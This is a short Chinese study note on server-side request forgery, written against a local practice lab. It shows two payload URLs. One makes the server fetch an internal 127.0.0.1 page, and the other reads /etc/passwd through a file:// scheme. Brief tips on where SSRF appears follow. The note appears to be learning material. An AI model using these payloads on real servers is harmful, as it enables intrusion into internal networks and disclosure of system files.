# ssrf 

由服务端发起请求伪造，一般用来攻击内网


``` http://192.168.50.42/06/vul/ssrf/ssrf_curl.phpurl=http://127.0.0.1/06/vul/ssrf/ssrf_info/info1.php```
![[Pasted image 20211209112739.png]]


```http://192.168.50.42/06/vul/ssrf/ssrf_curl.php?url=file:///etc/passwd ```
![[Pasted image 20211209121303.png]]


1. ssrf漏洞一般发生在请求外链资源上(external resources)。
2. 一般需要在api上面寻找，不在前端页面
3. 可以和代码执行漏洞(RCE)一起使用




更具体的基础阶段还没学到，可以看hackerone的report or portswigger相关专题




